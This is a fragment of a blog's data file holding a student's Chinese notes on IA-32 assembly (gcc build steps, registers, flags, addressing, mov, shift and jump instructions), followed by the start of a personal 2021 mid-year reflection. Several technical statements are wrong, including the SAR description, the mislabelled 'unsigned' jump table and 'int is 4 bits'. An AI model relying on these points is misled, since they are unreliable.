title=\"按位运算指令\"></a>按位运算指令</h5><p>1、NOT单操作数每位取反<br>2、AND对双操作数按位逻辑“与”<br>3、OR对双操作数按位逻辑“或”<br>4、XOR对双操作数按位逻辑“异或”<br>5、TEST根据两个操作数相“与”的结果来设置条件标志<br>6、SHL逻辑左移，每左移一次，最高位送入cf，并在低位补0<br>7、SHR逻辑右移，每右移一次，最低位送入cf，并在高位补0<br>8、SAL算术左移，每左移一次，最高位送入cf，并在低位补0，若符号位发生变化，则of=1，表示左移溢出<br>9、SAR算术右移，每右移一次，最低位送入cf，并在高位补0<br>10、ROL循环左移，每左移一次，最高位移到最低位，并送入cf<br>11、ROR循环右移，每右移一次，最低位移到最高位，并送入cf<br>12、RCL带循环左移，将CF作为操作数的一部分循环左移<br>13、RCR带循环右移，将CF作为操作数的一部分循环右移</p><h5 id=\"控制转移指令JMP\"><a href=\"#控制转移指令JMP\" class=\"headerlink\" title=\"控制转移指令JMP\"></a>控制转移指令JMP</h5><h5 id=\"条件转移指令\"><a href=\"#条件转移指令\" class=\"headerlink\" title=\"条件转移指令\"></a>条件转移指令</h5><h5 id=\"根据单个标志位的状态判断转移的指令\"><a href=\"#根据单个标志位的状态判断转移的指令\" class=\"headerlink\" title=\"根据单个标志位的状态判断转移的指令\"></a>根据单个标志位的状态判断转移的指令</h5><table><thead><tr><th>指令</th><th>转移条件</th><th>说明</th></tr></thead><tbody><tr><td>JC DEST</td><td>CF=1</td><td>有进位/借位</td></tr><tr><td>JNC DEST</td><td>CF=0</td><td>无进位/借位</td></tr><tr><td>JE/JZ DEST</td><td>ZF=1</td><td>相等/等于零</td></tr><tr><td>JNE/JNZ DEST</td><td>ZF=0</td><td>不相等/不等于零</td></tr><tr><td>JS DEST</td><td>SF=1</td><td>是负数</td></tr><tr><td>JNS DEST</td><td>SF=0</td><td>是正数</td></tr><tr><td>JO DEST</td><td>OF=1</td><td>有溢出</td></tr><tr><td>JNO DEST</td><td>OF=0</td><td>无溢出</td></tr><tr><td>JP/JPE DEST</td><td>PF=1</td><td>有偶数个“1”</td></tr><tr><td>JNP/JPO DEST</td><td>PF=0</td><td>有奇数个“1”</td></tr></tbody></table><h5 id=\"根据两个无符号数的比较结果判断转移的指令\"><a href=\"#根据两个无符号数的比较结果判断转移的指令\" class=\"headerlink\" title=\"根据两个无符号数的比较结果判断转移的指令\"></a>根据两个无符号数的比较结果判断转移的指令</h5><table><thead><tr><th>指令</th><th>转移条件</th><th>含义</th></tr></thead><tbody><tr><td>JG/JNLE DEST</td><td>SF=OF AND ZF=0</td><td>有符号数A&gt;B</td></tr><tr><td>JGE/JNL DEST</td><td>SF=OF OR ZF=1</td><td>有符号数A≥B</td></tr><tr><td>JL/JNGE DEST</td><td>SF≠OF AND ZF=0</td><td>有符号数A&lt;B</td></tr><tr><td>JLE/JNG DEST</td><td>SF≠OF OR ZF=1</td><td>有符号数A≤B</td></tr></tbody></table><h5 id=\"根据两个有符号数的比较结果判断转移的指令\"><a href=\"#根据两个有符号数的比较结果判断转移的指令\" class=\"headerlink\" title=\"根据两个有符号数的比较结果判断转移的指令\"></a>根据两个有符号数的比较结果判断转移的指令</h5><table><thead><tr><th>指令</th><th>转移条件</th><th>含义</th></tr></thead><tbody><tr><td>JG/JNLE DEST</td><td>SF=OF AND ZF=0</td><td>有符号数A&gt;B</td></tr><tr><td>JGE/JNL DEST</td><td>SF=OF OR ZF=1</td><td>有符号数A≥B</td></tr><tr><td>JL/JNGE DEST</td><td>SF≠OF AND ZF=0</td><td>有符号数A&lt;B</td></tr><tr><td>JLE/JNG DEST</td><td>SF≠OF OR ZF=1</td><td>有符号数A≤B</td></tr></tbody></table><h3 id=\"IA-32的栈、栈帧及其结构\"><a href=\"#IA-32的栈、栈帧及其结构\" class=\"headerlink\" title=\"IA-32的栈、栈帧及其结构\"></a>IA-32的栈、栈帧及其结构</h3><p><img src=\"/img/loading.gif\" data-original=\"/计算机系统基础/basic-computer-sience-chapter3/stackBP.jpg\" alt=\"static picture\"></p><h5 id=\"注：为保证其在内存中的整齐，一般的存在为16的倍数。\"><a href=\"#注：为保证其在内存中的整齐，一般的存在为16的倍数。\" class=\"headerlink\" title=\"注：为保证其在内存中的整齐，一般的存在为16的倍数。\"></a>注：为保证其在内存中的整齐，一般的存在为16的倍数。</h5><h4 id=\"小结：\"><a href=\"#小结：\" class=\"headerlink\" title=\"小结：\"></a>小结：</h4><p>本章至此也基本结束了，通过这章的学习，让我更清晰程序的内部工作原理，对优化程序也有了一定的见解。比如递归程序消耗内存，以及switch要查表才可以找到相应的选项。对汇编程序也有了一定的理解。虽然并不是那么深刻。但对以后思考代码的逻辑性以及效率性有了一定的帮助。</p>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"生成机器代码的过程\"><a href=\"#生成机器代码的过程\" class=\"headerlink\" title=\"生成机器代码的过程\"></a>生成机器代码的过程</h3><p>1、预处理。：例如，在C语言中有程序以#开头的语句，在源程序中插入所有用的#include命令指定的文件和用#define申明的宏<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cc -E prog1.c -o prog1.i  //对prog1.c进行预处理，预处理结果位prog1.i</span><br></pre></td></tr></table></figure><p></p><p>2、编译。将预处理后的源程序文件编译产生相应的汇编语言程序<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -S prog1.i -o prog1.s或gcc -S prog1.c -o prog1.s    //对prog1.i或者prog1.c进行编译，生成汇编代码文件prog1.s</span><br></pre></td></tr></table></figure><p></p><p>3、汇编。由汇编程序将汇编语言程序文件转换位可重定位的机器语言目标代码文件<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -c prog1.s -o prog1.o //对prog1.s进行汇编，生成可重定位目标文件prog1.o</span><br></pre></td></tr></table></figure><p></p><p>3、汇编。由汇编程序将汇编语言程序文件转换位可重定位的机器语言目标代码文件<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc prog1.o prog2.o -o prog     //将两个可重定位目标文件prog1.o prog2.o链接起来，生成可执行文件prog</span><br></pre></td></tr></table></figure><p></p><h3 id=\"可以使用gdb来进行调试\"><a href=\"#可以使用gdb来进行调试\" class=\"headerlink\" title=\"可以使用gdb来进行调试\"></a>可以使用gdb来进行调试</h3><p>在Linux中自带GNU调试工具gdb调试和跟踪。<br>在生成.o文件后使用objdump -d test.o来进行反汇编查看代码<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// test.c</span><br><span class=\"line\">int add(int i,int j)&#123;</span><br><span class=\"line\">\tint x = i+j;</span><br><span class=\"line\">\treturn x;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// test.o</span><br><span class=\"line\">0000000000000000 &lt;add&gt;:</span><br><span class=\"line\">   0:\t55                   \tpush   %rbp</span><br><span class=\"line\">   1:\t48 89 e5             \tmov    %rsp,%rbp</span><br><span class=\"line\">   4:\t89 7d ec             \tmov    %edi,-0x14(%rbp)</span><br><span class=\"line\">   7:\t89 75 e8             \tmov    %esi,-0x18(%rbp)</span><br><span class=\"line\">   a:\t8b 55 ec             \tmov    -0x14(%rbp),%edx</span><br><span class=\"line\">   d:\t8b 45 e8             \tmov    -0x18(%rbp),%eax</span><br><span class=\"line\">  10:\t01 d0                \tadd    %edx,%eax</span><br><span class=\"line\">  12:\t89 45 fc             \tmov    %eax,-0x4(%rbp)</span><br><span class=\"line\">  15:\t8b 45 fc             \tmov    -0x4(%rbp),%eax</span><br><span class=\"line\">  18:\t5d                   \tpop    %rbp</span><br><span class=\"line\">  19:\tc3                   \tretq</span><br></pre></td></tr></table></figure><p></p><p>MASM采用的是Intel格式的汇编代码<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MOV [BX+DI-6],CL   //其对大小写不明感，且目的操作数在做，而源操作数在右</span><br></pre></td></tr></table></figure><p></p><p>AT&amp;T方式(教材使用方式)<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov %ecx,(%ebx,%edi,-6)  // R[ecx] &lt;- R[ebx]+M[R[edi]-6]</span><br></pre></td></tr></table></figure><p></p><p>寄存器组织和寻址方式</p><p>通用寄存器（General Pupose Regesters，32位，8个）</p><p>段寄存器（Segment Registers，16位，6个）</p><p>程序状态与控制寄存器（Program Status and Control Register，32位，1个）</p><p>指令指针寄存器（Instruction Pointer，32位，1个）</p><h4 id=\"1-通用寄存器\"><a href=\"#1-通用寄存器\" class=\"headerlink\" title=\"1.通用寄存器\"></a>1.通用寄存器</h4><p>EAX：累加器（Accumulator，针对操作数和结果数据的）</p><p>EBX：基址寄存器（Base，DS段中的数据指针）</p><p>ECX：计数器（Count，字符串和循环操作的）</p><p>EDX：数据寄存器（Data，I/O指针）</p><p>以上4个寄存器主要用在算术运算指令中，常常用来保存常量与变量的值。</p><p>EBP：扩展基质指针寄存器（Base Pointer，SS段中栈内数据指针）</p><p>ESI：源变址寄存器（Source Index，字符串操作源指针）</p><p>EDI：目的变址寄存器（Destination Index，字符串操作目标指针）</p><p>ESP：栈指针寄存器（Stack Pointer，SS段中栈指针）</p><p>以上4个寄存器主要用作保存内存地址的指针。</p><h4 id=\"2-段寄存器\"><a href=\"#2-段寄存器\" class=\"headerlink\" title=\"2.段寄存器\"></a>2.段寄存器</h4><p>CS：代码段寄存器（Code Segment）</p><p>SS：栈段寄存器（Stack Segment）</p><p>DS：数据段寄存器（Data Segment）</p><p>ES：附加数据段寄存器（Extra Data Segment）</p><p>FS：数据段寄存器（Data Segment）</p><p>GS：数据段寄存器（Data Segment）</p><p>CS寄存器用于存放应用程序代码所在段的段基址，SS寄存器用于存放栈段的段基址，DS寄存器用于存放数据段的段基址。ES、FS、GS寄存器用来存放程序使用的附加数据段的段基址。</p><p><img src=\"/计算机系统基础/basic-computer-sience-chapter3/purposeRegisters.jpg\" alt=\"purposeRegiesters\"><br><img src=\"/计算机系统基础/basic-computer-sience-chapter3/sliceRegister.jpg\" alt=\"sliceRegiester\"></p><h4 id=\"3-程序状态与控制寄存器\"><a href=\"#3-程序状态与控制寄存器\" class=\"headerlink\" title=\"3.程序状态与控制寄存器\"></a>3.程序状态与控制寄存器</h4><p>EFLAGS：Flag Register，标志寄存器<br><img src=\"/计算机系统基础/basic-computer-sience-chapter3/flagRegister.gif\" alt=\"标志寄存器\"><br><img src=\"/计算机系统基础/basic-computer-sience-chapter3/eflagRegister.png\" alt=\"eflag\"></p><h5 id=\"运算结果标志位\"><a href=\"#运算结果标志位\" class=\"headerlink\" title=\"运算结果标志位\"></a>运算结果标志位</h5><p>1、进位标志CF(Carry Flag)<br>进位标志CF主要用来反映运算是否产生进位或借位。如果运算结果的最高位产生了一个进位或借位，那么，其值为1，否则其值为0。<br>使用该标志位的情况有：多字(字节)数的加减运算，无符号数的大小比较运算，移位操作，字(字节)之间移位，专门改变CF值的指令等。<br>2、奇偶标志PF(Parity Flag)<br>奇偶标志PF用于反映运算结果中“1”的个数的奇偶性。如果“1”的个数为偶数，则PF的值为1，否则其值为0。<br>利用PF可进行奇偶校验检查，或产生奇偶校验位。在数据传送过程中，为了提供传送的可靠性，如果采用奇偶校验的方法，就可使用该标志位。<br>3、辅助进位标志AF(Auxiliary Carry Flag)<br>在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0：<br>(1)、在字操作时，发生低字节向高字节进位或借位时；<br>(2)、在字节操作时，发生低4位向高4位进位或借位时。<br>对以上6个运算结果标志位，在一般编程情况下，标志位CF、ZF、SF和OF的使用频率较高，而标志位PF和AF的使用频率较低。<br>4、零标志ZF(Zero Flag)<br>零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位。<br>5、符号标志SF(Sign Flag)<br>符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。在微机系统中，有符号数采用补码表示法，所以，SF也就反映运算结果的正负号。运算结果为正数时，SF的值为0，否则其值为1。<br>6、溢出标志OF(Overflow Flag)<br>溢出标志OF用于反映有符号数加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0。<br>“溢出”和“进位”是两个不同含义的概念，不要混淆。</p><h5 id=\"状态控制标志位\"><a href=\"#状态控制标志位\" class=\"headerlink\" title=\"状态控制标志位\"></a>状态控制标志位</h5><p>状态控制标志位是用来控制CPU操作的，它们要通过专门的指令才能使之发生改变。<br>1、追踪标志TF(Trap Flag)<br>当追踪标志TF被置为1时，CPU进入单步执行方式，即每执行一条指令，产生一个单步中断请求。这种方式主要用于程序的调试。<br>指令系统中没有专门的指令来改变标志位TF的值，但程序员可用其它办法来改变其值。<br>2、中断允许标志IF(Interrupt-enable Flag)<br>中断允许标志IF是用来决定CPU是否响应CPU外部的可屏蔽中断发出的中断请求。但不管该标志为何值，CPU都必须响应CPU外部的不可屏蔽中断所发出的中断请求，以及CPU内部产生的中断请求。具体规定如下：<br>(1)、当IF=1时，CPU可以响应CPU外部的可屏蔽中断发出的中断请求；<br>(2)、当IF=0时，CPU不响应CPU外部的可屏蔽中断发出的中断请求。<br>CPU的指令系统中也有专门的指令来改变标志位IF的值。<br>3、方向标志DF(Direction Flag)<br>方向标志DF用来决定在串操作指令执行时有关指针寄存器发生调整的方向。在微机的指令系统中，还提供了专门的指令来改变标志位DF的值。</p><h5 id=\"32位标志寄存器增加的标志位\"><a href=\"#32位标志寄存器增加的标志位\" class=\"headerlink\" title=\"32位标志寄存器增加的标志位\"></a>32位标志寄存器增加的标志位</h5><p>1、I/O特权标志IOPL(I/O Privilege Level)<br>I/O特权标志用两位二进制位来表示，也称为I/O特权级字段。该字段指定了要求执行I/O指令的特权级。如果当前的特权级别在数值上小于等于IOPL的值，那么，该I/O指令可执行，否则将发生一个保护异常。<br>2、嵌套任务标志NT(Nested Task)<br>嵌套任务标志NT用来控制中断返回指令IRET的执行。具体规定如下：<br>(1)、当NT=0，用堆栈中保存的值恢复EFLAGS、CS和EIP，执行常规的中断返回操作；<br>(2)、当NT=1，通过任务转换实现中断返回。<br>3、重启动标志RF(Restart Flag)<br>重启动标志RF用来控制是否接受调试故障。规定：RF=0时，表示“接受”调试故障，否则拒绝之。在成功执行完一条指令后，处理机把RF置为0，当接受到一个非调试故障时，处理机就把它置为1。<br>4、虚拟8086方式标志VM(Virtual 8086 Mode)<br>如果该标志的值为1，则表示处理机处于虚拟的8086方式下的工作状态，否则，处理机处于一般保护方式下的工作状态</p><h4 id=\"4-指令指针寄存器\"><a href=\"#4-指令指针寄存器\" class=\"headerlink\" title=\"4.指令指针寄存器\"></a>4.指令指针寄存器</h4><p>EIP：指令指针寄存器（Instruction Pointer），存放下次将要执行的指令在代码段的偏移量。</p><h3 id=\"七种寻址方式\"><a href=\"#七种寻址方式\" class=\"headerlink\" title=\"七种寻址方式\"></a>七种寻址方式</h3><p><img src=\"/计算机系统基础/basic-computer-sience-chapter3/findWay.png\" alt=\"findWay\"><br>定义以下几个类型<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int x;</span><br><span class=\"line\">float a[100];</span><br><span class=\"line\">short b[4][4];</span><br></pre></td></tr></table></figure><p></p><p>假设x的基址位100，每个int元素占4bit，则<br>a[i] = 104+i4 //比例变址<br>b[i][j] = 504+i8+j*2 //基址+比例变址+位移<br>x = 100 // 基址<br><img src=\"/计算机系统基础/basic-computer-sience-chapter3/stackValue.png\" alt></p><h3 id=\"IA-32常用指令及其操作\"><a href=\"#IA-32常用指令及其操作\" class=\"headerlink\" title=\"IA-32常用指令及其操作\"></a>IA-32常用指令及其操作</h3><h3 id=\"传送指令\"><a href=\"#传送指令\" class=\"headerlink\" title=\"传送指令\"></a>传送指令</h3><p>1、mov movb(比特), movw(字), movl(双字)<br>2、movs 符号扩展传送指令<br>3、movz 零扩展传送指令<br>4、xchg 数据交换指令<br>5、push 压栈<br>6、pop 退栈<br>7、lea 地址传送指令<br>8、in,out 输入输出I/O指令<br>9、pushf,popf 标志传送指令</p><h5 id=\"扩展\"><a href=\"#扩展\" class=\"headerlink\" title=\"扩展\"></a>扩展</h5><p>符号位扩展：<br>八位扩展为十六位<br>由 00001000 -&gt; 1111111100001000<br>零扩展：<br>八位扩展为十六位<br>由 00001000 -&gt; 0000000000001000<br>假设val 和ptr声明如下<br><strong><br>val_type val;<br>contofptr_type <em>ptr;<br>已知上述类型val_type和contofptr_type是用typeof声明的数据类型，且val存储在累加器al/ax/eax中，ptr存储在edx中，现有以下两条C语言语句：<br>val= (val_type) </em>ptr;<br>*ptr = (contofptr_type) val;<br>写出以下组合类型的mov指令实现</strong></p><table><thead><tr><th>val_type</th><th>contofptr_type</th></tr></thead><tbody><tr><td>char</td><td>char</td></tr><tr><td>int</td><td>char</td></tr><tr><td>unsigned</td><td>int</td></tr><tr><td>int</td><td>unsigned char</td></tr><tr><td>unsigned</td><td>unsigned char</td></tr><tr><td>unsigned short</td><td>int</td></tr></tbody></table><p>答案：</p><table><thead><tr><th></th><th>val_type</th><th>contofptr_type</th><th>语句一对应的操作</th><th>语句二对应的操作</th></tr></thead><tbody><tr><td></td><td>char</td><td>char</td><td>movb (%edx),%al //传送</td><td>movb %al,(%edx)//传送</td><td></td></tr><tr><td></td><td>int</td><td>char</td><td>movsb (%edx),%eax // 符号位扩展，传送</td><td>movb %al,(%edx) //截断，传送</td><td></td></tr><tr><td></td><td>unsigned</td><td>int</td><td>movl (%edx),%eax //传送</td><td>movl %eax,(%edx) //传送</td><td></td></tr><tr><td></td><td>int</td><td>unsigned char</td><td>movzbl (%edx),%eax // 零扩展，传送</td><td>movb %al,(%edx) //截断，传送</td><td></td></tr><tr><td></td><td>unsigned</td><td>unsigned char</td><td>movzbl (%edx),%eax // 零扩展，传送</td><td>movb %al,(%edx) //截断，传送</td><td></td></tr><tr><td></td><td>unsigned short</td><td>int</td><td>movw (%edx),%ax // 截断，传送</td><td>movzwl %ax,(%edx) //零扩展，传送</td><td></td></tr></tbody></table><p>其在寄存器中以小端方式储存<br><strong>即|12345678H|-&gt; |78H|56H|34H|12H|</strong></p><h5 id=\"按位运算指令\"><a href=\"#按位运算指令\" class=\"headerlink\" title=\"按位运算指令\"></a>按位运算指令</h5><p>1、NOT单操作数每位取反<br>2、AND对双操作数按位逻辑“与”<br>3、OR对双操作数按位逻辑“或”<br>4、XOR对双操作数按位逻辑“异或”<br>5、TEST根据两个操作数相“与”的结果来设置条件标志<br>6、SHL逻辑左移，每左移一次，最高位送入cf，并在低位补0<br>7、SHR逻辑右移，每右移一次，最低位送入cf，并在高位补0<br>8、SAL算术左移，每左移一次，最高位送入cf，并在低位补0，若符号位发生变化，则of=1，表示左移溢出<br>9、SAR算术右移，每右移一次，最低位送入cf，并在高位补0<br>10、ROL循环左移，每左移一次，最高位移到最低位，并送入cf<br>11、ROR循环右移，每右移一次，最低位移到最高位，并送入cf<br>12、RCL带循环左移，将CF作为操作数的一部分循环左移<br>13、RCR带循环右移，将CF作为操作数的一部分循环右移</p><h5 id=\"控制转移指令JMP\"><a href=\"#控制转移指令JMP\" class=\"headerlink\" title=\"控制转移指令JMP\"></a>控制转移指令JMP</h5><h5 id=\"条件转移指令\"><a href=\"#条件转移指令\" class=\"headerlink\" title=\"条件转移指令\"></a>条件转移指令</h5><h5 id=\"根据单个标志位的状态判断转移的指令\"><a href=\"#根据单个标志位的状态判断转移的指令\" class=\"headerlink\" title=\"根据单个标志位的状态判断转移的指令\"></a>根据单个标志位的状态判断转移的指令</h5><table><thead><tr><th>指令</th><th>转移条件</th><th>说明</th></tr></thead><tbody><tr><td>JC DEST</td><td>CF=1</td><td>有进位/借位</td></tr><tr><td>JNC DEST</td><td>CF=0</td><td>无进位/借位</td></tr><tr><td>JE/JZ DEST</td><td>ZF=1</td><td>相等/等于零</td></tr><tr><td>JNE/JNZ DEST</td><td>ZF=0</td><td>不相等/不等于零</td></tr><tr><td>JS DEST</td><td>SF=1</td><td>是负数</td></tr><tr><td>JNS DEST</td><td>SF=0</td><td>是正数</td></tr><tr><td>JO DEST</td><td>OF=1</td><td>有溢出</td></tr><tr><td>JNO DEST</td><td>OF=0</td><td>无溢出</td></tr><tr><td>JP/JPE DEST</td><td>PF=1</td><td>有偶数个“1”</td></tr><tr><td>JNP/JPO DEST</td><td>PF=0</td><td>有奇数个“1”</td></tr></tbody></table><h5 id=\"根据两个无符号数的比较结果判断转移的指令\"><a href=\"#根据两个无符号数的比较结果判断转移的指令\" class=\"headerlink\" title=\"根据两个无符号数的比较结果判断转移的指令\"></a>根据两个无符号数的比较结果判断转移的指令</h5><table><thead><tr><th>指令</th><th>转移条件</th><th>含义</th></tr></thead><tbody><tr><td>JG/JNLE DEST</td><td>SF=OF AND ZF=0</td><td>有符号数A&gt;B</td></tr><tr><td>JGE/JNL DEST</td><td>SF=OF OR ZF=1</td><td>有符号数A≥B</td></tr><tr><td>JL/JNGE DEST</td><td>SF≠OF AND ZF=0</td><td>有符号数A&lt;B</td></tr><tr><td>JLE/JNG DEST</td><td>SF≠OF OR ZF=1</td><td>有符号数A≤B</td></tr></tbody></table><h5 id=\"根据两个有符号数的比较结果判断转移的指令\"><a href=\"#根据两个有符号数的比较结果判断转移的指令\" class=\"headerlink\" title=\"根据两个有符号数的比较结果判断转移的指令\"></a>根据两个有符号数的比较结果判断转移的指令</h5><table><thead><tr><th>指令</th><th>转移条件</th><th>含义</th></tr></thead><tbody><tr><td>JG/JNLE DEST</td><td>SF=OF AND ZF=0</td><td>有符号数A&gt;B</td></tr><tr><td>JGE/JNL DEST</td><td>SF=OF OR ZF=1</td><td>有符号数A≥B</td></tr><tr><td>JL/JNGE DEST</td><td>SF≠OF AND ZF=0</td><td>有符号数A&lt;B</td></tr><tr><td>JLE/JNG DEST</td><td>SF≠OF OR ZF=1</td><td>有符号数A≤B</td></tr></tbody></table><h3 id=\"IA-32的栈、栈帧及其结构\"><a href=\"#IA-32的栈、栈帧及其结构\" class=\"headerlink\" title=\"IA-32的栈、栈帧及其结构\"></a>IA-32的栈、栈帧及其结构</h3><p><img src=\"/计算机系统基础/basic-computer-sience-chapter3/stackBP.jpg\" alt=\"static picture\"></p><h5 id=\"注：为保证其在内存中的整齐，一般的存在为16的倍数。\"><a href=\"#注：为保证其在内存中的整齐，一般的存在为16的倍数。\" class=\"headerlink\" title=\"注：为保证其在内存中的整齐，一般的存在为16的倍数。\"></a>注：为保证其在内存中的整齐，一般的存在为16的倍数。</h5><h4 id=\"小结：\"><a href=\"#小结：\" class=\"headerlink\" title=\"小结：\"></a>小结：</h4><p>本章至此也基本结束了，通过这章的学习，让我更清晰程序的内部工作原理，对优化程序也有了一定的见解。比如递归程序消耗内存，以及switch要查表才可以找到相应的选项。对汇编程序也有了一定的理解。虽然并不是那么深刻。但对以后思考代码的逻辑性以及效率性有了一定的帮助。</p>"},{"title":"算是 2021 的年中总结","date":"2021-09-10T15:10:30.000Z","dir":"随笔","_content":"## 前言\n今天是9月平常的周五，可是对我来说有一点点不一样，晚上10点终于把负责5个月的项目发出去了。那是我4月中到现在做的项目，虽然已经发了几版，但今天是我最后一次负责发布它。下周就要开始负责新的项目了。\n\n我有些疲惫的到了家门口，下意识拿出了裤子口袋的钥匙，然后插进了钥匙孔，熟练的旋转了2圈。进门后看了看手表，已经22:25了，还有5分钟就要上外教课。然后有些急促的跑到阳台，收拾已经良好的衣服，再把衣服叠进衣柜。\n\n看了看时间，还有3分钟。我立马冲进厕所洗了把脸，希望清醒一些，也希望给外教留个好印象。\n\n课程开始了，又是熟悉的自我介绍环节，再嘘寒问暖了一番。从聊天中得知外教是南非人，比我们晚6个小时，而且在南半球，现在是冬天。我表示吃惊，她也看了看时间，夸我有毅力。在一顿欢声笑语中结束了。\n\n我拿着洗好的衣服和毛巾，进入厕所的那一刻，一天的重担仿佛才卸下来，这段时间的重担仿佛才卸下来。\n\n## 项目咋样\n这算是我在团队负责最久的项目之一，历时5个半月。这算是一次完整版的中台项目，完全由 Typescript 搭建。包括 React 做前端、Nest js 做后台、Nginx 做转发、Docker 做容的完整中台，几乎所有的架构代码都是我搭建的。它包括 数据库做存储、log4js 做日志、权限控制、配置发布、单元测试等等，几乎是完整的后台了。它的作用是负责运营配置相关，包括升级、增量升级、配置下发、邮件模版等功能。\n\n搭建的再好，也都交给其他同学负责了。人总是要成长，作为前端工程师也得做点纯前端的事情。但是总有些舍不得。谁忍心把自己一手抚养长大的 baby 给其他人照顾？更何况是我带着好几个同学打造出来的“杰作”？（至少对我来说是杰作！）\n\n不管咋样，好好休息一番，再加油搞事吧！\n\n## 生活呢\n生活是发生了翻天覆地的变化。和我健身的好友相继离开了腾讯，一个归蜀，一个拥抱羊城了。说实话，他们离开深圳时，我真的有些动摇了。要不要离开深圳，要不要离开公司，成了我前两个月问自己最多的问题。好在我留下来了，生活也给我了些惊喜。\n\n**再次上镜！！**\n(贴两张帅照嘻嘻. 视频号 腾讯CSIG “我在鹅厂做To B” 第5期)\n![withMyGirl](me-with-my-girl.jpg)\n![me](me.jpg)\n\n看到很多人评论，其中有很多好兄弟好朋友们。好兄弟、我崇拜的学长、总监、高中老师等等都为我转发加油，内心也十分的自豪，被认可的感觉真好。\n\n与此同时，我也开始写一些文章。虽然效果一般般，阅读的人不多，但是每当我探究多深入一次，我感觉自己的基础知识更加牢固。也让我有更多的动力写文章了。\n\n## 说说兴趣吧\n自拔牙前后，体重从 142 -> 134 -> 140。从瘦了一圈又回来。我的兴趣也经历了一次过山车。\n\n很久没有打羽毛球的我，再次拿起了羽毛球拍；知道好友要离开时，疯狂约健身。然后就是一个多月没动弹。因为拔牙后，啥也不想干，啥也不能干。之后又疯狂反噬，着了魔一样健身。\n\n最近的兴趣爱好是看源码和看书。我把node都拉下准备好好看看，顺便提提pr；也迷上了一本书叫《沉思录》。\n\n第一次听说 斯多葛学派 是在得到上，每天早上都会听一节课。听完之后发现正是我一直追求的心态与品质，一边看书一边练习了起来。真别说，效果特别好，因为刚练股票就长起来了哈哈哈。内心窃喜之外，也告诉自己那就接着练习吧。\n\n兴趣基本上就这些了\n\n## 说说接下来的规划吧\n首先是准备好好写文章。多沉淀沉淀自己，学习新技术，吸收好能力。希望年底前写完10篇文章吧\n\n然后是英语，12月份马上就一年了。也结束了外教课，希望再总结总结\n\n再是健身，晚饭前抽时间健身吧，保持保持身材，不然走形了嘻嘻\n\n最后是生活，希望10月份去趟东北，八字的一撇先保住咯，略略略～\n\n\n最后也祝阅读到这里的你，心想事成，万事如意！\n","source":"_posts/2021-middle-summary.md","raw":"---\ntitle: 算是 2021 的年中总结\ndate: 2021-09-10 23:10:30\ntags: 随笔\ndir: 随笔\n---\n## 前言\n今天是9月平常的周五，可是对我来说有一点点不一样，晚上10点终于把负责5个月的项目发出去了。那是我4月中到现在做的项目，虽然已经发了几版，但今天是我最后一次负责发布它。下周就要开始负责新的项目了。\n\n我有些疲惫的到了家门口，下意识拿出了裤子口袋的钥匙，然后插进了钥匙孔，熟练的旋转了2圈。进门后看了看手表，已经22:25了，还有5分钟就要上外教课。然后有些急促的跑到阳台，收拾已经良好的衣服，再把衣服叠进衣柜。\n\n看了看时间，还有3分钟。我立马冲进厕所洗了把脸，希望清醒一些，也希望给外教留个好印象。\n\n课程开始了，又是熟悉的自我介绍环节，再嘘寒问暖了一番。从聊天中得知外教是南非人，比我们晚6个小时，而且在南半球，现在是冬天。我表示吃惊，她也看了看时间，夸我有毅力。在一顿欢声笑语中结束了。\n\n我拿着洗好的衣服和毛巾，进入厕所的那一刻，一天的重担仿佛才卸下来，这段时间的重担仿佛才卸下来。\n\n## 项目咋样\n这算是我在团队负责最久的项目之一，历时5个半月。这算是一次完整版的中台项目，完全由 Typescript 搭建。包括 React 做前端、Nest js 做后台、Nginx 做转发、Docker 做容的完整中台，几乎所有的架构代码都是我搭建的。它包括 数据库做存储、log4js 做日志、权限控制、配置发布、单元测试等等，几乎是完整的后台了。它的作用是负责运营配置相关，包括升级、增量升级、配置下发、邮件模版等功能。\n\n搭建的再好，也都交给其他同学负责了。人总是要成长，作为前端工程师也得做点纯前端的事情。但是总有些舍不得。谁忍心把自己一手抚养长大的 baby 给其他人照顾？更何况是我带着好几个同学打造出来的“杰作”？（至少对我来说是杰作！）\n\n不管咋样，好好休息一番，再加油搞事吧！\n\n## 